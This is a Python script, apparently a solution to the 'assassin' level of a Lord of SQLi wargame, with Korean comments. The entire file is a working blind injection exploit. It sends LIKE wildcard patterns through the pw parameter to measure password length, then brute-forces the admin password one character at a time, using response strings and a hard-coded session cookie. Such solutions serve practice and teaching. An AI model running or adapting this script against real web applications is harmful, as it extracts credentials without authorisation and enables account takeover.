#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
from string import digits
from string import ascii_lowercase

guestpwlen = 0
adminpwlen = 0
key = "" # admin 비밀번호가 저장될 문자열
guestkey = "" # guest 비밀번호가 저장될 문자열
findadmin = False # guest 비밀번호 문자와 admin 비밀번호 문자가 같은 경우 처리하기 위해 만든 변수 

for i in range(1, 20):
    url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
    data = ('_' * i) # 한 문자 와일드카드인 _ 이용하여 pw 길이 측정
    data = quote(data)
    re = urllib.request.Request(url + data)

    re.add_header(
        "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    re.add_header(
        "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
    )

    req = urllib.request.urlopen(re)

    result = req.readline()
    print(result)

    if str(result).find("Hello guest") != -1:
        guestpwlen = i
        print ("guest pw length : " + str(guestpwlen))

    if str(result).find("Hello admin") != -1:
        adminpwlen = i
        print ("admin pw length : " + str(adminpwlen))
        findadmin = True
        break

if not findadmin:
    adminpwlen = guestpwlen
    print ("admin pw length : " + str(adminpwlen))
findadmin = False

for i in range(0, adminpwlen):
    if not findadmin:
        key = guestkey
    findadmin = False
    for j in digits + ascii_lowercase:
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
        data = key + "{}".format(j) + ("_" * (7 - i))
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81")
        re.add_header(
            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req = urllib.request.urlopen(re)

        result = req.readline()
        print(result)

        if str(result).find("Hello guest") != -1: # guest와 admin이 같은 비밀번호를 가질 경우 Hello guest가 출력되므로 일단 guestkey에 저장했다가 findadmin을 이용하여 처리
            guestkey += j
            print ("g : " + guestkey)

        if str(result).find("Hello admin") != -1:
            key += j
            print ("a : " + key)
            findadmin = True
            break
print (key)